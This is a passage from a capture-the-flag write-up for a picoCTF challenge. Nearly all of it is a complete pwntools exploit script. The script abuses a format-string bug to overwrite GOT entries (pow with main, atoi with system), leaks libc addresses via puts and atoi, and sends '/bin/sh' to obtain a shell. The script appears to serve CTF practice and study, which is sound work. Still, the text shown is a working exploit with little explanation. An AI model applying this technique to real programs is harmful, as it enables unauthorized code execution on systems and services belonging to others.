payload2 += str(int(system_addr_low) - int(system_addr_high)).encode("ascii") + b"p%11$hn%"
payload2 += str(int(system_addr_medium) - int(system_addr_low)).encode("ascii") + b"p%12$hn--" 

r.sendlineafter(b"B: ",payload2)

r.interactive()


```


### full solve code on local

```python
from pwn import *

binary = ELF("chall")
#r = process("./chall")



if not args.REMOTE:
    r = process(binary.path)
    gdb.attach(r, api = True)
    libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6")
else:
    r = remote('mars.picoctf.net', 31929)
    #libc = ELF("./libc6_2.31-0ubuntu9.1_amd64.so")


pow_got = binary.got['pow']
main_addr = binary.symbols['main']

log.info(f"Main address: {hex(main_addr)}") # 0x400837
log.info(f"pow() GOT address: {hex(pow_got)}") # 0x601040

payload1 = b"11111111" + p64(pow_got) #+ p64(pow_got+4)

r.sendlineafter(b"A: ",payload1)

#payload2 = b"1_______%1p%11$n--------"
payload2 = b"1_______%" + str(int(main_addr) - 46).encode("ascii") + b"p%11$n--" #4196361

r.sendlineafter(b"B: ",payload2)

r.recvuntil("Calculating for A: ")
log.info("rewrote pow GOT to main")

######################################

def send_payload(r, a, b):
    log.info(f"Sending:\nA:\n{a}\nB:\n{hexdump(b)}")
    r.sendlineafter("A: ", a)
    r.sendlineafter("B: ", b)

def send_format(r, format, values):
    format_prefix = b'1_______'
    values_prefix = b'1_______'
    send_payload(r, format_prefix + format, values_prefix + values)
    out = r.recvline()
    arr = out.split(b" and ")
    res = arr[0].replace(b"Calculating for A: " + format_prefix, b"")
    log.info(f"Received:\n{hexdump(res)}")
    return res

log.info(f"puts() GOT address: {hex(binary.got['puts'])}")

fmt_first_offset = 43
puts_offset_libc = libc.symbols["puts"] #0x0875a0


output = send_format(r, b"%43$s.%44$s.", p64(binary.got["puts"]) + p64(binary.got["atoi"]))

print(output)

puts_addr_str = output.split(b'.')[0].ljust(8, b'\x00')
atoi_addr_str = output.split(b".")[1].ljust(8, b'\x00')
puts_addr = int.from_bytes(puts_addr_str, "little") 
atoi_addr = int.from_bytes(atoi_addr_str, "little") 

log.info(f"puts() runtime address: {hex(puts_addr)}\n")

log.info(f"atoi() runtime address: {hex(atoi_addr)}\n")


libc_base_addr = u64(puts_addr_str) - puts_offset_libc
log.info(f"libc_base address: {hex(libc_base_addr)}\n")

system_offset = libc.symbols['system'] #0x055410
system_addr = libc_base_addr + system_offset
log.info(f"system address: {hex(system_addr)}\n") # demo 0x7fe0e8abc570

##########################################################


atoi_got = binary.got['atoi']

log.info(f"atoi() GOT address: {hex(atoi_got)}") 


#system_addr = 0x7fe0e8abc570 #demo

system_addr_high = (system_addr >> 32) & 0xFFFF
system_addr_medium = (system_addr >> 16) & 0xFFFF
system_addr_low = system_addr & 0xFFFF

print("Original values:")
print("High:", int(system_addr_high))
print("Medium:", int(system_addr_medium))
print("Low:", int(system_addr_low))

# Đưa các giá trị vào một danh sách
values = [
    ("high", system_addr_high, "13" ),
    ("medium", system_addr_medium, "12" ),
    ("low", system_addr_low, "11")
]

# Sắp xếp danh sách dựa trên giá trị
values.sort(key=lambda x: x[1])

print("\nSorted values:")

for item in values:
    print(item[0] + ":" , item[1] , item[2] )


payload1 = b"11111111" + p64(atoi_got ) + p64(atoi_got + 2 ) + p64(atoi_got + 4)

r.sendlineafter(b"A: ",payload1)

#payload2 = b"1_______%1p%12$n%2p%11$n"

# payload2 = b"1_______%" + str(int(system_addr_high) - 46).encode("ascii") + b"p%13$hn%" 
# payload2 += str(int(system_addr_low) - int(system_addr_high)).encode("ascii") + b"p%11$hn%"
# payload2 += str(int(system_addr_medium) - int(system_addr_low)).encode("ascii") + b"p%12$hn--" 
payload2 = b"1_______%" + str(values[0][1] - 46).encode("ascii") + b"p%" + values[0][2].encode("ascii") + b"$hn%" 
payload2 += str(values[1][1] - values[0][1]).encode("ascii") + b"p%"+ values[1][2].encode("ascii") + b"$hn%"
payload2 += str(values[2][1] - values[1][1]).encode("ascii") + b"p%"+ values[2][2].encode("ascii") + b"$hn--" 

r.sendlineafter(b"B: ",payload2)

##################################

r.recvuntil("Calculating for A: ")
log.info("rewrote atoi GOT to system")

payload1 = b"/bin/sh\x00"
r.sendlineafter(b"A: ",payload1)
payload2 = b"/sh"
r.sendlineafter(b"B: ",payload2)
                
r.interactive()


```